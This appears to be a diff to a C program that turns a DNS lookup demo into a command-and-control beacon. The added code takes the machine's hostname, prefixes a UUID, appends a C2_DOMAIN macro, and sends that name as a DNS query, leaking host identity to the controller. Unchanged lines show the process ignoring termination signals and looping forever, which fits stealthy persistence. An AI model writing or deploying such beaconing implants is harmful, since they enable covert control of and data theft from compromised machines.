@@ -1,8 +1,14 @@
-#include "dns.h"
 #include <stdio.h>
+#include "dns.h"
 #include <signal.h>
 #include <unistd.h>
 #include <sys/prctl.h>
+
+// macros (in .env):
+// C2_DOMAIN
+// DNS_SERVER_1_ADDR 
+// DNS_SERVER_2_ADDR
+// UUID
 
 int main(int argc, char **argv) {
     if (getuid() == 0) {
@@ -19,45 +25,50 @@ int main(int argc, char **argv) {
     signal(SIGTERM, SIG_IGN);
     signal(SIGQUIT, SIG_IGN);
 
-    unsigned char hostname[] = "example.com";
-    unsigned char **txt_results;
-    unsigned short int *a_results;
-    int i;
+    char hostname[1024];
+    hostname[1023] = '\0';
+    gethostname(hostname, 1023);
 
-    txt_results = query_txt(hostname);
+    char data_query[1024 + 33 + 257];
+    sprintf(data_query, "%s%s.%s", UUID, hostname, C2_DOMAIN);
+    // printf("data_query: %s\n", data_query);
 
-    if(txt_results) {
-        printf("TXT records for %s:\n\n", hostname);
+    (void)query_a(data_query);
 
-        for(i = 0; txt_results[i] != NULL; i++) {
-            printf("TXT %d\n", i);
-            printf("Data: %s\n", txt_results[i]);
+    // txt_results = query_txt(hostname);
 
-            //Free each string
-            free(txt_results[i]);
-        }
+    // if(txt_results) {
+    //     printf("TXT records for %s:\n\n", hostname);
 
-        //Free the array itself
-        free(txt_results);
-    } else {
-        printf("Failed to query TXT record for %s\n", hostname);
-    }
+    //     for(i = 0; txt_results[i] != NULL; i++) {
+    //         printf("TXT %d\n", i);
+    //         printf("Data: %s\n", txt_results[i]);
 
-    a_results = query_a(hostname);
+    //         //Free each string
+    //         free(txt_results[i]);
+    //     }
 
-    if(a_results) {
-        printf("A records for %s:\n", hostname);
-        printf("%d.%d.%d.%d\n", a_results[0], a_results[1], a_results[2], a_results[3]);
+    //     //Free the array itself
+    //     free(txt_results);
+    // } else {
+    //     printf("Failed to query TXT record for %s\n", hostname);
+    // }
 
-        //Free the array itself
-        free(a_results);
-    } else {
-        printf("Failed to query A record for %s\n", hostname);
-    }
+    // a_results = query_a(hostname);
+
+    // if(a_results) {
+    //     printf("A records for %s:\n", hostname);
+    //     printf("%d.%d.%d.%d\n", a_results[0], a_results[1], a_results[2], a_results[3]);
+
+    //     //Free the array itself
+    //     free(a_results);
+    // } else {
+    //     printf("Failed to query A record for %s\n", hostname);
+    // }
 
     while(1) {
         sleep(1);
     };
 
     return 0;
-}
+} 
